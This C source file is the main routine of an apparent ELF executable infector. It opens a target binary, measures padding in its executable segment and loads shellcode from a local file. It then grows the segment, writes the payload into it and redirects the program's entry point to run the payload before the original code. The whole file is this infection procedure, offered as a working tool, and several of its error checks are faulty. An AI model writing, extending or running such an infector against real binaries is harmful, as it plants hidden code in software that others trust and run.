#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <elf.h>

#include "caving.h"
#include "headers.h"
#include "info.h"
#include "payload.h"

int main(int argc, char *argv[])
{
    int retval = 0;
    int padding = 0;
    int payload_size = 0;
    FILE *binary = NULL;
    Elf64_Phdr exe_ph;
    Elf64_Addr exe_ph_start = 0; //where executable program header begins
    Elf64_Addr entrypoint = 0;
    Elf64_Addr old_entry = 0;
    Elf64_Addr prev_exe_segment_end = 0; //where exe ph ends before modification
    uint8_t *payload = NULL;
    target_info t_info;

    memset(&exe_ph, 0, sizeof(exe_ph));
    memset(&t_info, 0, sizeof(target_info));

    if (argc != 2)
    {
        puts("Invalid usage");
        return 1;
    }

    binary = fopen(argv[1], "r+");
    if (NULL == binary)
    {
        perror("Unable to open binary");
        retval = 1;
        return retval;
    }

    retval = get_ph_info(binary, &t_info, &entrypoint);
    if (retval > 0)
    {
        puts("Failed to find segment size");
        retval = 1;
        goto cleanup;
    }

    exe_ph_start = find_executable_ph(binary, &exe_ph, t_info);
    if (exe_ph_start <= 0)
    {
        puts("Failed to find executable segment");
        goto cleanup;
    }

    printf("Execuatable ph at: 0x%x\n", exe_ph_start);
    printf("Executable segment at: 0x%x\n", exe_ph.p_paddr);

    t_info.exe_segment_start = exe_ph.p_paddr;
    t_info.exe_segment_size = exe_ph.p_filesz;

    retval = calculate_padding(binary, exe_ph, &padding);
    if (retval > 0)
    {
        puts("Failed to calculate available padding");
        goto cleanup;
    }

    printf("Padding available: %d bytes\n", padding);

    payload_size = get_payload(&payload, "./test.shell");
    if (retval > 0)
    {
        puts("Failed to load payload");
        goto cleanup;
    }

    retval = stamp_entrypoint(payload, entrypoint);
    if (retval > 0)
    {
        puts("faild to stamp payload with original entrypoint");
        goto cleanup;
    }

    printf("Payload size: %d bytes\n", payload_size);
    if (payload_size < padding)
    {
        puts("payload will fit!");
    }
    else
    {
        puts("not enough room for payload :(");
    }

    printf("Original exe segment size: %d\n", exe_ph.p_filesz);

    prev_exe_segment_end = expand_execuable_segment(binary, exe_ph_start, exe_ph, payload_size); //necessary?
    if (prev_exe_segment_end <= 0)
    {
        puts("Failed to expand executable segment");
        goto cleanup;
    }

    /*retval = expand_fini(binary, payload_size); not needed?
    if (retval > 0)
    {
        puts("Failed to expand ifni section");
        goto cleanup;
    }*/

    printf("Prev segment end: 0x%x\n", prev_exe_segment_end);

    printf("Writing payload to address: 0x%x\n", prev_exe_segment_end);

    retval = inject_payload(binary, prev_exe_segment_end, payload, payload_size);
    if (retval > 0)
    {
        puts("Failed to inject payload");
        goto cleanup;
    }

    old_entry = swap_entry_point(binary, exe_ph.p_paddr + exe_ph.p_filesz);
    if (old_entry <= 0)
    {
        puts("Failed to swap entry point");
        goto cleanup;
    }

    printf("old entry point: 0x%x\n", old_entry);

    puts("Successfully overwrote entry point");

cleanup:
    fclose(binary);
    if (payload)
    {
        free(payload);
    }
    return retval;
}
